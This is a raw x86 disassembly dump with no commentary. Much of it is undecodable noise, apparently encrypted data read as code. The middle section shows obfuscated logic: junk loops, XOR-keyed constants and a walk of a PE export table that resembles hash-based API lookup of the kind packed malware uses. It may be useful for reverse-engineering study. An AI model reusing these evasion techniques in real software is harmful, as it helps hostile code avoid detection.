  40cb98:	jmp    0x1cc5:0xa0266961
  40cb9f:	adc    BYTE PTR [eax-0x2e],bh
  40cba2:	mov    ds:0xc039d483,eax
  40cba7:	dec    edi
  40cba8:	jge    0x40cbdd
  40cbaa:	mov    al,al
  40cbac:	dec    esp
  40cbad:	rcl    BYTE PTR [ebx+0x28],1
  40cbb0:	rol    DWORD PTR [edi],1
  40cbb2:	sub    eax,DWORD PTR [edi]
  40cbb4:	adc    dl,BYTE PTR [ebp+0x5605e74d]
  40cbba:	xchg   dl,ch
  40cbbc:	push   0xffffff8b
  40cbbe:	push   esp
  40cbbf:	rcr    DWORD PTR [edi-0x4f88e5a1],cl
  40cbc5:	aas    
  40cbc6:	sub    bh,BYTE PTR [eax-0x4da44a2d]
  40cbcc:	sub    BYTE PTR [ecx-0x56fede11],ah
  40cbd2:	idiv   DWORD PTR ds:0xe02a9bfb
  40cbd8:	adc    DWORD PTR [ebp+0x727abd88],ecx
  40cbde:	in     eax,0x24
  40cbe0:	ficomp DWORD PTR [esi]
  40cbe2:	push   eax
  40cbe3:	lahf   
  40cbe4:	aam    0x1
  40cbe6:	lahf   
  40cbe7:	jp     0x40cc3e
  40cbe9:	mov    cl,0xe
  40cbeb:	xchg   ecx,eax
  40cbec:	outs   dx,BYTE PTR ds:[esi]
  40cbed:	pushf  
  40cbee:	push   ebx
  40cbef:	cdq    
  40cbf0:	mov    ds:0x68e311c6,al
  40cbf5:	jge    0x40cbcf
  40cbf7:	mov    ch,0x7c
  40cbf9:	aas    
  40cbfa:	fidivr WORD PTR [ebx+0x58]
  40cbfd:	pop    es
  40cbfe:	xchg   edi,eax
  40cbff:	adc    dh,BYTE PTR [esi+0x2c]
  40cc02:	add    BYTE PTR [eax+edi*8],0x70
  40cc06:	arpl   WORD PTR [eax],bp
  40cc08:	pusha  
  40cc09:	jp     0x40cbae
  40cc0b:	cmp    bh,dl
  40cc0d:	(bad)  
  40cc0f:	fisttp DWORD PTR ds:0xd9a16a37
  40cc15:	jns    0x40cc1c
  40cc17:	mov    ch,0x63
  40cc19:	push   esp
  40cc1a:	and    eax,0xe15b218f
  40cc1f:	popa   
  40cc20:	mov    cl,ch
  40cc22:	es nop
  40cc24:	inc    ebp
  40cc25:	ffree  st(1)
  40cc27:	into   
  40cc28:	popf   
  40cc29:	arpl   ax,dx
  40cc2b:	cmp    dl,dh
  40cc2d:	push   ds
  40cc2e:	scas   al,BYTE PTR es:[edi]
  40cc2f:	inc    edx
  40cc30:	inc    esp
  40cc31:	sbb    BYTE PTR [ebp-0x7e],cl
  40cc34:	sbb    dl,BYTE PTR gs:[edx+edx*1+0x36]
  40cc39:	loop   0x40cc3d
  40cc3b:	out    0x3d,eax
  40cc3d:	push   esp
  40cc3e:	add    DWORD PTR [edx+0x79],ebp
  40cc41:	je     0x40cc56
  40cc43:	mov    eax,0x20f19337
  40cc48:	jge    0x40ccbd
  40cc4a:	rcl    DWORD PTR [eax+0x2d371fd8],cl
  40cc50:	into   
  40cc51:	or     DWORD PTR [ebp-0x2c],0x28a8de31
  40cc58:	mov    ds:0xd5e78308,eax
  40cc5d:	test   DWORD PTR [ebx+0x52],edx
  40cc60:	jp     0x40cc5f
  40cc62:	pop    ecx
  40cc63:	int3   
  40cc64:	xchg   esi,eax
  40cc65:	and    DWORD PTR [ebx+ebx*1],esi
  40cc68:	out    0x1a,al
  40cc6a:	mov    eax,0xd770b3ac
  40cc6f:	rol    ah,1
  40cc71:	div    ebx
  40cc73:	xor    BYTE PTR [ecx],dl
  40cc75:	fs jg  0x40cc36
  40cc78:	sbb    al,0x34
  40cc7a:	push   eax
  40cc7b:	and    eax,0xeae67244
  40cc80:	push   eax
  40cc81:	(bad)  
  40cc82:	loopne 0x40cd03
  40cc84:	dec    edx
  40cc85:	sub    al,0x8b
  40cc87:	aad    0x74
  40cc89:	sbb    eax,0x63ab2bd5
  40cc8e:	mov    ebx,0xd04ecf75
  40cc93:	ret    0xa22a
  40cc96:	mov    ebp,0xd8647d0b
  40cc9b:	pop    esp
  40cc9c:	mov    dh,0xe8
  40cc9e:	or     bh,ch
  40cca0:	mov    esp,0x6a735491
  40cca5:	xchg   DWORD PTR [ebx-0x47677afe],eax
  40ccab:	mov    bh,0x3a
  40ccad:	ror    BYTE PTR [edi+ebp*1],cl
  40ccb0:	shl    DWORD PTR [edx],1
  40ccb2:	in     al,0xf5
  40ccb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccb5:	aaa    
  40ccb6:	clc    
  40ccb7:	jno    0x40ccb6
  40ccb9:	push   0x211f04fa
  40ccbe:	int    0x5
  40ccc0:	test   edx,ecx
  40ccc2:	xchg   BYTE PTR [ebp-0x64],al
  40ccc5:	shr    edx,1
  40ccc7:	out    dx,eax
  40ccc8:	lds    edi,FWORD PTR [edi+0x8]
  40cccb:	mov    BYTE PTR [eax-0x6c],dh
  40ccce:	jno    0x40cce5
  40ccd0:	pop    ss
  40ccd1:	dec    ebp
  40ccd2:	ja     0x40cd2c
  40ccd4:	pop    ebp
  40ccd5:	repz mov eax,ds:0x52126bdd
  40ccdb:	xor    al,0xe7
  40ccdd:	or     ebp,DWORD PTR [ebx-0x6c]
  40cce0:	outs   dx,DWORD PTR ds:[esi]
  40cce1:	inc    esi
  40cce2:	mul    eax
  40cce4:	das    
  40cce5:	test   DWORD PTR [edi-0x26],esp
  40cce8:	fmul   DWORD PTR [edi+0x6e074fae]
  40ccee:	xchg   ebp,eax
  40ccef:	test   DWORD PTR [ebx+0x2e148064],ebx
  40ccf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ccf6:	cld    
  40ccf7:	gs sub eax,0xa283bed2
  40ccfd:	test   esp,esi
  40ccff:	dec    esi
  40cd00:	in     al,dx
  40cd01:	mov    fs,WORD PTR [eax+0x7]
  40cd04:	push   ebp
  40cd05:	shl    edi,1
  40cd07:	hlt    
  40cd08:	sbb    BYTE PTR [edx-0x71],dh
  40cd0b:	inc    esi
  40cd0c:	jb     0x40cd1f
  40cd0e:	repnz test BYTE PTR [edi-0x38cb7176],0x45
  40cd16:	cld    
  40cd17:	mov    ecx,0xc7f89c85
  40cd1c:	add    eax,0x42a3f6
  40cd21:	adc    DWORD PTR [eax],eax
  40cd23:	add    BYTE PTR [eax],al
  40cd25:	cmp    DWORD PTR ds:0x42a3f6,0x0
  40cd2c:	je     0x40cd62
  40cd32:	cmp    DWORD PTR ds:0x42a3f6,0x1a
  40cd39:	jg     0x40cd62
  40cd3f:	jmp    0x40cd52
  40cd44:	push   DWORD PTR [ebp-0x10]
  40cd47:	push   0x42a3ce
  40cd4c:	call   DWORD PTR ds:0x42a54a
  40cd52:	mov    eax,ds:0x42a3f6
  40cd57:	dec    eax
  40cd58:	mov    ds:0x42a3f6,eax
  40cd5d:	jmp    0x40cd25
  40cd62:	push   ebx
  40cd63:	add    DWORD PTR ds:0x42a436,0x20e2
  40cd6d:	mov    DWORD PTR [ebp-0xc],0xf89c85ba
  40cd74:	and    DWORD PTR ds:0x42a40e,0x0
  40cd7e:	jmp    0x40cd91
  40cd83:	xor    eax,eax
  40cd85:	or     eax,DWORD PTR ds:0x42a40e
  40cd8b:	inc    eax
  40cd8c:	mov    ds:0x42a40e,eax
  40cd91:	cmp    DWORD PTR ds:0x42a40e,0x1e
  40cd98:	jae    0x40cdbe
  40cd9e:	cmp    DWORD PTR ds:0x42a40e,0x1f
  40cda5:	jge    0x40cdbe
  40cdab:	jmp    0x40cdb9
  40cdb0:	push   DWORD PTR [ebp-0x18]
  40cdb3:	call   DWORD PTR ds:0x42a526
  40cdb9:	jmp    0x40cd83
  40cdbe:	mov    eax,DWORD PTR [ebp-0x4]
  40cdc1:	and    DWORD PTR ds:0x42a422,0x42a3b2
  40cdcb:	push   esi
  40cdcc:	adc    DWORD PTR ds:0x42a44a,0x42a43e
  40cdd6:	mov    esi,0x75108a8
  40cddb:	and    DWORD PTR ds:0x42a3ee,0x42a42a
  40cde5:	xor    eax,esi
  40cde7:	push   edi
  40cde8:	neg    edi
  40cdea:	mov    edi,0x3272ef
  40cdef:	sub    DWORD PTR ds:0x42a436,0x606e
  40cdf9:	add    eax,edi
  40cdfb:	mov    DWORD PTR [ebp-0x1c],eax
  40cdfe:	mov    eax,DWORD PTR [ebp+0x14]
  40ce01:	test   eax,eax
  40ce03:	mov    DWORD PTR ds:0x42a426,0x6967
  40ce0d:	je     0x40ce8f
  40ce13:	mov    DWORD PTR ds:0x42a3fe,0x1e
  40ce1d:	cmp    DWORD PTR ds:0x42a3fe,0x0
  40ce24:	je     0x40ce77
  40ce2a:	cmp    DWORD PTR ds:0x42a3fe,0xc
  40ce31:	jb     0x40ce77
  40ce37:	jmp    0x40ce4b
  40ce3c:	push   DWORD PTR [ebp-0x20]
  40ce3f:	push   DWORD PTR [ebp-0x24]
  40ce42:	push   DWORD PTR [ebp-0x24]
  40ce45:	call   DWORD PTR ds:0x42a52a
  40ce4b:	cmp    DWORD PTR ds:0x42a3fe,0xd
  40ce52:	jne    0x40ce65
  40ce58:	mov    ebx,DWORD PTR ds:0x42a3fe
  40ce5e:	dec    ebx
  40ce5f:	mov    DWORD PTR ds:0x42a3fe,ebx
  40ce65:	mov    ebx,DWORD PTR ds:0x42a3fe
  40ce6b:	dec    ebx
  40ce6c:	mov    DWORD PTR ds:0x42a3fe,ebx
  40ce72:	jmp    0x40ce1d
  40ce77:	mov    eax,DWORD PTR [ebp+0x14]
  40ce7a:	or     ebx,0x6757
  40ce80:	mov    eax,DWORD PTR [eax]
  40ce82:	xor    DWORD PTR ds:0x42a3a6,0x5a4b
  40ce8c:	mov    DWORD PTR [ebp-0x1c],eax
  40ce8f:	mov    eax,DWORD PTR [ebp-0x4]
  40ce92:	dec    DWORD PTR ds:0x42a40e
  40ce98:	xor    eax,esi
  40ce9a:	add    eax,edi
  40ce9c:	and    DWORD PTR ds:0x42a40e,0x0
  40cea6:	jmp    0x40ceb8
  40ceab:	mov    ebx,DWORD PTR ds:0x42a40e
  40ceb1:	inc    ebx
  40ceb2:	mov    DWORD PTR ds:0x42a40e,ebx
  40ceb8:	cmp    DWORD PTR ds:0x42a40e,0x13
  40cebf:	jae    0x40cf11
  40cec5:	cmp    DWORD PTR ds:0x42a40e,0x4
  40cecc:	jg     0x40cf11
  40ced2:	jmp    0x40cef2
  40ced7:	push   0x629b
  40cedc:	push   DWORD PTR [ebp-0x20]
  40cedf:	push   0x4472
  40cee4:	push   DWORD PTR [ebp-0x1c]
  40cee7:	push   0x42a3ae
  40ceec:	call   DWORD PTR ds:0x42a52e
  40cef2:	cmp    DWORD PTR ds:0x42a40e,0x3
  40cef9:	jne    0x40cf0c
  40ceff:	mov    ebx,DWORD PTR ds:0x42a40e
  40cf05:	inc    ebx
  40cf06:	mov    DWORD PTR ds:0x42a40e,ebx
  40cf0c:	jmp    0x40ceab
  40cf11:	mov    DWORD PTR [ebp-0x8],eax
  40cf14:	mov    eax,DWORD PTR [ebp-0xc]
  40cf17:	and    DWORD PTR ds:0x42a41a,0x4058
  40cf21:	xor    eax,esi
  40cf23:	sbb    DWORD PTR ds:0x42a412,edi
  40cf29:	add    eax,edi
  40cf2b:	and    DWORD PTR ds:0x42a3e2,0x0
  40cf35:	jmp    0x40cf47
  40cf3a:	mov    ebx,DWORD PTR ds:0x42a3e2
  40cf40:	inc    ebx
  40cf41:	mov    DWORD PTR ds:0x42a3e2,ebx
  40cf47:	cmp    DWORD PTR ds:0x42a3e2,0x10
  40cf4e:	jae    0x40cf77
  40cf54:	cmp    DWORD PTR ds:0x42a3e2,0x19
  40cf5b:	jbe    0x40cf77
  40cf61:	jmp    0x40cf72
  40cf66:	push   DWORD PTR [ebp-0x1c]
  40cf69:	push   DWORD PTR [ebp-0x10]
  40cf6c:	call   DWORD PTR ds:0x42a532
  40cf72:	jmp    0x40cf3a
  40cf77:	mov    DWORD PTR [ebp-0x24],eax
  40cf7a:	mov    eax,DWORD PTR [ebp-0x4]
  40cf7d:	sbb    DWORD PTR ds:0x42a422,0x3c99
  40cf87:	xor    eax,esi
  40cf89:	mov    ebx,DWORD PTR ds:0x42a3ae
  40cf8f:	sbb    DWORD PTR ds:0x42a402,ebx
  40cf95:	add    eax,edi
  40cf97:	neg    DWORD PTR ds:0x42a446
  40cf9d:	mov    DWORD PTR [ebp-0x30],eax
  40cfa0:	and    DWORD PTR ds:0x42a40a,0x0
  40cfaa:	jmp    0x40cfba
  40cfaf:	mov    eax,ds:0x42a40a
  40cfb4:	inc    eax
  40cfb5:	mov    ds:0x42a40a,eax
  40cfba:	cmp    DWORD PTR ds:0x42a40a,0x19
  40cfc1:	jae    0x40d006
  40cfc7:	cmp    DWORD PTR ds:0x42a40a,0xf
  40cfce:	jb     0x40d006
  40cfd4:	jmp    0x40cfe9
  40cfd9:	push   0x5bac
  40cfde:	push   0x42a3c2
  40cfe3:	call   DWORD PTR ds:0x42a55a
  40cfe9:	cmp    DWORD PTR ds:0x42a40a,0xe
  40cff0:	jne    0x40d001
  40cff6:	mov    eax,ds:0x42a40a
  40cffb:	inc    eax
  40cffc:	mov    ds:0x42a40a,eax
  40d001:	jmp    0x40cfaf
  40d006:	mov    ebx,DWORD PTR [ebp-0x4]
  40d009:	xor    ebx,esi
  40d00b:	and    DWORD PTR ds:0x42a3be,ecx
  40d011:	add    ebx,edi
  40d013:	and    DWORD PTR ds:0x42a3fe,0x0
  40d01d:	jmp    0x40d02d
  40d022:	mov    eax,ds:0x42a3fe
  40d027:	inc    eax
  40d028:	mov    ds:0x42a3fe,eax
  40d02d:	cmp    DWORD PTR ds:0x42a3fe,0x13
  40d034:	jae    0x40d072
  40d03a:	cmp    DWORD PTR ds:0x42a3fe,0x6
  40d041:	jle    0x40d072
  40d047:	jmp    0x40d055
  40d04c:	push   DWORD PTR [ebp-0x20]
  40d04f:	call   DWORD PTR ds:0x42a53a
  40d055:	cmp    DWORD PTR ds:0x42a3fe,0x5
  40d05c:	jne    0x40d06d
  40d062:	mov    eax,ds:0x42a3fe
  40d067:	inc    eax
  40d068:	mov    ds:0x42a3fe,eax
  40d06d:	jmp    0x40d022
  40d072:	mov    eax,DWORD PTR [ebp-0x24]
  40d075:	add    DWORD PTR ds:0x42a432,0x76fe
  40d07f:	sub    eax,edi
  40d081:	lea    ecx,[ebx-0x3272ef]
  40d087:	or     DWORD PTR ds:0x42a3f6,0x6e45
  40d091:	xor    eax,esi
  40d093:	sub    DWORD PTR ds:0x42a3c2,0x42a412
  40d09d:	xor    ecx,esi
  40d09f:	cmp    ecx,eax
  40d0a1:	je     0x40d250
  40d0a7:	inc    eax
  40d0a8:	mov    eax,DWORD PTR [ebp-0x4]
  40d0ab:	add    DWORD PTR ds:0x42a3f6,0x42a3de
  40d0b5:	xor    eax,esi
  40d0b7:	xor    DWORD PTR ds:0x42a3e6,0x42a436
  40d0c1:	add    eax,edi
  40d0c3:	mov    DWORD PTR ds:0x42a41e,0x1ae8
  40d0cd:	cmp    ebx,eax
  40d0cf:	jne    0x40d22d
  40d0d5:	xor    DWORD PTR ds:0x42a3be,0x42a436
  40d0df:	push   DWORD PTR [ebp+0x8]
  40d0e2:	call   0x424b8d
  40d0e7:	mov    DWORD PTR [ebp-0x14],eax
  40d0ea:	xor    ecx,ecx
  40d0ec:	xor    ecx,DWORD PTR ds:0x42a456
  40d0f2:	mov    eax,ds:0x42a4f2
  40d0f7:	sub    ecx,eax
  40d0f9:	or     ecx,DWORD PTR [ecx+eax*1]
  40d0fc:	mov    eax,DWORD PTR [ebp-0x4]
  40d0ff:	sbb    ecx,0x17a4
  40d105:	mov    ecx,DWORD PTR [ebp-0x14]
  40d108:	xor    DWORD PTR ds:0x42a3da,0x42a3f6
  40d112:	xor    eax,esi
  40d114:	add    eax,edi
  40d116:	mov    DWORD PTR ds:0x42a3aa,0x307a
  40d120:	cmp    ecx,eax
  40d122:	mov    DWORD PTR ds:0x42a40e,0xd4
  40d12c:	je     0x40d2bb
  40d132:	or     DWORD PTR ds:0x42a416,0x42a3b6
  40d13c:	push   DWORD PTR [ebp-0x14]
  40d13f:	not    DWORD PTR ds:0x42a3f6
  40d145:	push   DWORD PTR [ebp+0x8]
  40d148:	sbb    DWORD PTR ds:0x42a3fe,0x3b6a
  40d152:	call   0x424c62
  40d157:	mov    DWORD PTR [ebp-0x14],eax
  40d15a:	or     eax,DWORD PTR ds:0x42a40e
  40d160:	mov    eax,DWORD PTR [ebp-0x4]
  40d163:	mov    ecx,DWORD PTR [ebp-0x14]
  40d166:	xor    eax,esi
  40d168:	and    DWORD PTR ds:0x42a42a,0x42a44e
  40d172:	add    eax,edi
  40d174:	cmp    ecx,eax
  40d176:	mov    DWORD PTR ds:0x42a426,0x7d26
  40d180:	je     0x40d2bb
  40d186:	xor    ecx,DWORD PTR ds:0x42a43a
  40d18c:	mov    eax,DWORD PTR [ebp-0x14]
  40d18f:	mov    eax,DWORD PTR [eax+0x18]
  40d192:	or     DWORD PTR ds:0x42a3ea,0x5e55
  40d19c:	mov    DWORD PTR [ebp-0x24],eax
  40d19f:	xor    DWORD PTR ds:0x42a40e,ecx
  40d1a5:	mov    eax,DWORD PTR [ebp-0x14]
  40d1a8:	and    DWORD PTR ds:0x42a43e,0x0
  40d1b2:	mov    ecx,DWORD PTR ds:0x42a43e
  40d1b8:	inc    ecx
  40d1b9:	mov    DWORD PTR ds:0x42a43e,ecx
  40d1bf:	cmp    DWORD PTR ds:0x42a43e,0x1f
  40d1c6:	jge    0x40d1f1
  40d1cc:	jmp    0x40d1e4
  40d1d1:	push   0x848c
  40d1d6:	push   0x1918
  40d1db:	push   DWORD PTR [ebp-0x10]
  40d1de:	call   DWORD PTR ds:0x42a55e
  40d1e4:	cmp    DWORD PTR ds:0x42a43e,0x14
  40d1eb:	jb     0x40d1b2
  40d1f1:	mov    ecx,DWORD PTR [ebp+0x8]
  40d1f4:	add    ecx,DWORD PTR [eax+0x20]
  40d1f7:	and    eax,DWORD PTR ds:0x42a452
  40d1fd:	mov    DWORD PTR [ebp-0x2c],ecx
  40d200:	mov    eax,DWORD PTR [ebp-0x14]
  40d203:	add    DWORD PTR ds:0x42a3fe,0x4a53
  40d20d:	mov    ecx,DWORD PTR [ebp+0x8]
  40d210:	not    DWORD PTR ds:0x42a3e2
  40d216:	add    ecx,DWORD PTR [eax+0x24]
  40d219:	mov    DWORD PTR [ebp-0x34],ecx
  40d21c:	mov    eax,DWORD PTR [ebp-0x14]
  40d21f:	mov    ecx,DWORD PTR [ebp+0x8]
  40d222:	add    ecx,DWORD PTR [eax+0x1c]
  40d225:	mov    DWORD PTR [ebp-0x14],ecx
  40d228:	jmp    0x40d283
  40d22d:	mov    eax,DWORD PTR [ebp-0x2c]
  40d230:	mov    ecx,DWORD PTR [ebp+0x8]
  40d233:	add    ecx,DWORD PTR [eax+ebx*4]
  40d236:	mov    DWORD PTR [ebp-0x28],ecx
  40d239:	mov    eax,DWORD PTR [ebp-0x4]
  40d23c:	mov    ecx,DWORD PTR [ebp-0x28]
  40d23f:	xor    eax,esi
  40d241:	add    eax,edi
  40d243:	cmp    ecx,eax
  40d245:	je     0x40d283
  40d24b:	jmp    0x40d274
  40d250:	mov    eax,DWORD PTR [ebp-0x4]
  40d253:	mov    ecx,DWORD PTR [ebp-0x8]
  40d256:	xor    eax,esi
  40d258:	add    eax,edi
  40d25a:	cmp    ecx,eax
  40d25c:	mov    eax,DWORD PTR [ebp-0x4]
  40d25f:	je     0x40d2be
  40d265:	mov    ecx,DWORD PTR [ebp-0x30]
  40d268:	xor    eax,esi
  40d26a:	add    eax,edi
  40d26c:	cmp    ecx,eax
  40d26e:	je     0x40d2c7
  40d274:	lea    eax,[ebp-0x8]
  40d277:	push   eax
  40d278:	push   DWORD PTR [ebp-0x28]
  40d27b:	push   DWORD PTR [ebp+0xc]
  40d27e:	call   0x40f865
  40d283:	mov    eax,DWORD PTR [ebp-0x4]
  40d286:	mov    ecx,DWORD PTR [ebp-0x8]
  40d289:	xor    eax,esi
  40d28b:	add    eax,edi
  40d28d:	cmp    ecx,eax
  40d28f:	je     0x40d2aa
  40d295:	mov    eax,DWORD PTR [ebp-0x34]
  40d298:	movzx  eax,WORD PTR [eax+ebx*2]
  40d29c:	mov    ecx,DWORD PTR [ebp-0x14]
  40d29f:	mov    eax,DWORD PTR [ecx+eax*4]
  40d2a2:	mov    DWORD PTR [ebp-0x38],eax
  40d2a5:	jmp    0x40d250
  40d2aa:	mov    eax,DWORD PTR [ebp-0xc]
  40d2ad:	xor    eax,esi
  40d2af:	lea    ebx,[ebx+eax*1+0x3272ef]
  40d2b6:	jmp    0x40d013
  40d2bb:	mov    eax,DWORD PTR [ebp-0x4]
  40d2be:	xor    eax,esi
  40d2c0:	add    eax,edi
  40d2c2:	jmp    0x40f7a8
  40d2c7:	mov    eax,DWORD PTR [ebp-0x38]
  40d2ca:	add    eax,DWORD PTR [ebp+0x8]
  40d2cd:	mov    DWORD PTR [ebp-0x18],eax
  40d2d0:	mov    eax,DWORD PTR [ebp-0x1c]
  40d2d3:	test   eax,eax
  40d2d5:	je     0x40d36f
  40d2db:	mov    DWORD PTR [ebp-0x20],0x0
  40d2e2:	push   0x3
  40d2e4:	xor    edx,edx
  40d2e6:	pop    edx
  40d2e7:	add    edx,0x8
  40d2ea:	push   edx
  40d2eb:	pop    ecx
  40d2ec:	push   0x6
  40d2ee:	dec    ecx
  40d2ef:	pop    ebx
  40d2f0:	dec    ebx
  40d2f1:	xchg   ebx,ecx
  40d2f3:	sub    ebx,ecx
  40d2f5:	xchg   ebx,ecx
  40d2f7:	dec    ecx
  40d2f8:	mov    eax,DWORD PTR [ebp-0x1c]
  40d2fb:	imul   eax,ecx
  40d2fe:	sub    esp,eax
  40d300:	mov    DWORD PTR [ebp-0x20],esp
  40d303:	mov    eax,DWORD PTR [ebp-0x4]
  40d306:	xor    eax,esi
  40d308:	add    eax,edi
  40d30a:	jmp    0x40d348
  40d30f:	mov    ecx,DWORD PTR [ebp-0xc]
  40d312:	mov    eax,DWORD PTR [ebp+0x8]
  40d315:	mov    edx,DWORD PTR [ebp+0x14]
  40d318:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d31c:	xor    ecx,esi
  40d31e:	add    ecx,edi
  40d320:	xor    edx,edx
  40d322:	div    ecx
  40d324:	mov    ecx,DWORD PTR [ebp-0x4]
  40d327:	xor    ecx,esi
  40d329:	lea    eax,[ecx+eax*1+0x3272ef]
  40d330:	mov    ecx,DWORD PTR [ebp+0x8]
  40d333:	mov    edx,DWORD PTR [ebp-0x20]
  40d336:	mov    DWORD PTR [edx+ecx*4],eax
  40d339:	mov    eax,DWORD PTR [ebp-0xc]
  40d33c:	mov    ecx,DWORD PTR [ebp+0x8]
  40d33f:	xor    eax,esi
  40d341:	lea    eax,[eax+ecx*1+0x3272ef]
  40d348:	mov    DWORD PTR [ebp+0x8],eax
  40d34b:	mov    eax,DWORD PTR [ebp-0xc]
  40d34e:	mov    ecx,DWORD PTR [ebp+0x14]
  40d351:	xor    eax,esi
  40d353:	add    eax,edi
  40d355:	imul   eax,DWORD PTR [ecx]
  40d358:	mov    ecx,DWORD PTR [ebp-0x4]
  40d35b:	mov    edx,DWORD PTR [ebp+0x8]
  40d35e:	xor    ecx,esi
  40d360:	lea    ecx,[ecx+edx*1+0x3272ef]
  40d367:	cmp    ecx,eax
  40d369:	jne    0x40d30f
  40d36f:	mov    eax,DWORD PTR [ebp-0x4]
  40d372:	xor    eax,esi
  40d374:	add    eax,edi
  40d376:	mov    DWORD PTR [ebp-0x10],eax
  40d379:	mov    ebx,0x65655
  40d37e:	add    ebx,0x3234
  40d384:	xchg   ebx,esi
  40d386:	xor    ebx,ebx
  40d388:	push   esi
  40d389:	mov    esi,ebx
  40d38b:	pop    ebx
  40d38c:	mov    edx,esi
  40d38e:	jmp    0x40f750
  40d393:	ja     0x40d3b0
  40d395:	test   DWORD PTR [ebp-0x7b],esp
  40d398:	mov    ebx,0x91a51b97
  40d39d:	test   BYTE PTR [ecx-0x3228ccb5],0xc5
  40d3a4:	leave  
  40d3a5:	jp     0x40d421
  40d3a7:	fstp   QWORD PTR [edi+0x7a]
  40d3aa:	jp     0x40d375
  40d3ac:	and    DWORD PTR [edi],esp
  40d3ae:	fucomip st,st(0)
  40d3b0:	std    
  40d3b1:	and    dl,BYTE PTR [ecx+0x49]
  40d3b4:	repz push ecx
  40d3b6:	test   eax,0xec061e3f
  40d3bb:	inc    ebx
  40d3bc:	test   al,0x26
  40d3be:	mov    dl,0xbc
  40d3c0:	sub    al,BYTE PTR [ebx-0x1d]
  40d3c3:	aaa    
  40d3c4:	push   esi
  40d3c5:	jp     0x40d3d8
  40d3c7:	retf   0x303e
  40d3ca:	ret    0xef2c
  40d3cd:	push   esi
  40d3ce:	mov    ch,0x14
  40d3d0:	xor    DWORD PTR [ebx-0x5a],ebx
  40d3d3:	jmp    0x40d3b7
  40d3d5:	outs   dx,DWORD PTR ds:[esi]
  40d3d6:	pop    esi
  40d3d7:	xchg   ebx,eax
  40d3d8:	outs   dx,BYTE PTR ds:[esi]
  40d3d9:	pop    ds
  40d3da:	ret    0x60b7
  40d3dd:	sbb    eax,0xbc04b8cc
  40d3e2:	inc    esp
  40d3e3:	pop    edi
  40d3e4:	and    BYTE PTR [ecx+0x2b],cl
  40d3e7:	aas    
  40d3e8:	push   cs
  40d3e9:	add    eax,ebx
  40d3eb:	cmp    DWORD PTR [ebx+0x10],0x90bd90d2
  40d3f2:	mov    BYTE PTR [ebp+0x103dbd89],dh
  40d3f8:	push   ebx
  40d3f9:	xchg   ebp,eax
  40d3fa:	lds    ecx,FWORD PTR [ecx]
  40d3fc:	(bad)  
  40d3fd:	mov    ebx,0xae7a2b57
  40d402:	int3   
  40d403:	push   edi
  40d404:	jg     0x40d3d8
  40d406:	sahf   
  40d407:	test   eax,0x8184232b
  40d40c:	pop    ss
  40d40d:	(bad)  
  40d40e:	int    0x63
  40d410:	lahf   
  40d411:	loopne 0x40d408
  40d413:	nop
  40d414:	mov    dh,0x47
  40d416:	sub    al,ah
  40d418:	pop    ss
  40d419:	shl    ebx,cl
  40d41b:	dec    esp
  40d41c:	ret    
  40d41d:	leave  
  40d41e:	mov    ecx,DWORD PTR [eax+eax*2]
  40d421:	jo     0x40d460
  40d423:	jno    0x40d3de
  40d425:	push   ss
  40d426:	mov    dh,0xd3
  40d428:	cdq    
  40d429:	pop    ebp
  40d42a:	xlat   BYTE PTR ds:[ebx]
  40d42b:	add    dl,cl
  40d42d:	mov    edx,0x9f21f403
  40d432:	sub    al,BYTE PTR [eax+0x22]
  40d435:	add    al,0x65
  40d437:	xchg   DWORD PTR [eax-0x55ec723a],eax
  40d43d:	test   al,0x1d
  40d43f:	xchg   esp,eax
  40d440:	add    edi,DWORD PTR [ecx-0x54]
  40d443:	test   al,0xb1
  40d445:	aaa    
  40d446:	lock adc eax,0x7b0ce36e
  40d44c:	(bad)  
  40d44d:	jecxz  0x40d47e
  40d44f:	jmp    0x43342822
  40d454:	add    al,0x65
  40d456:	push   esi
  40d457:	rol    DWORD PTR fs:[esi],cl
  40d45a:	aaa    
  40d45b:	jno    0x40d484
  40d45d:	adc    al,0xc4
  40d45f:	pop    ds
  40d460:	je     0x40d445
  40d462:	(bad)  
  40d463:	sbb    bl,BYTE PTR [esi+ebx*8-0xd7e0bd7]
  40d46a:	dec    ebx
  40d46b:	addr16 fs fs mov bl,0xd1
  40d470:	cmp    BYTE PTR [edx],bh
  40d472:	mov    edi,0x456464bf
  40d477:	jmp    0x645c:0xc134624e
  40d47e:	fucomip st,st(7)
  40d480:	sbb    edi,ecx
  40d482:	cmp    al,0xa
  40d484:	std    
  40d485:	mov    eax,ds:0xa2898d8d
  40d48a:	cdq    
  40d48b:	ret    
  40d48c:	scas   al,BYTE PTR es:[edi]
  40d48d:	xor    eax,0x2e62becc
  40d492:	stos   DWORD PTR es:[edi],eax
  40d493:	std    
  40d494:	push   ebp
  40d495:	shl    al,1
  40d497:	mov    ds:0xe318b754,al
  40d49c:	pushf  
  40d49d:	mov    ch,0x7a
  40d49f:	inc    edi
  40d4a0:	push   edx
  40d4a1:	pop    edx
  40d4a2:	mov    eax,ds:0xbc7c2348
  40d4a7:	jo     0x40d49c
  40d4a9:	inc    eax
  40d4aa:	loopne 0x40d49d
  40d4ac:	xchg   ecx,eax
  40d4ad:	pop    esp
  40d4ae:	mov    cl,dl
  40d4b0:	mov    bh,0x95
  40d4b2:	and    ch,al
  40d4b4:	test   BYTE PTR [edx],0xb4
  40d4b7:	jb     0x40d4ed
  40d4b9:	cmp    eax,0xc8c50baa
  40d4be:	dec    eax
  40d4bf:	add    ecx,DWORD PTR [ebx-0x1f98e20e]
  40d4c5:	dec    esp
  40d4c6:	add    al,0x80
  40d4c8:	inc    ebp
  40d4c9:	sub    BYTE PTR [eax-0x5ae07055],ah
  40d4cf:	pop    esi
  40d4d0:	dec    ecx
  40d4d1:	inc    ebp
  40d4d2:	lahf   
  40d4d3:	mov    ch,0x2e
  40d4d5:	cwde   
  40d4d6:	dec    edi
  40d4d7:	(bad)  
  40d4d8:	int    0xa9
  40d4da:	xor    BYTE PTR [eax-0x55c91765],dh
  40d4e0:	adc    eax,0xec6f59c5
  40d4e5:	sti    
  40d4e6:	pop    ecx
  40d4e7:	icebp  
  40d4e8:	dec    eax
  40d4e9:	mov    ch,0xa7
  40d4eb:	mov    ebp,0x7eb72c1f
  40d4f0:	lods   eax,DWORD PTR ds:[esi]
  40d4f1:	popf   
  40d4f2:	cmp    eax,DWORD PTR [eax-0x73a1368b]
  40d4f8:	ds jo  0x40d4e4
  40d4fb:	int    0x18
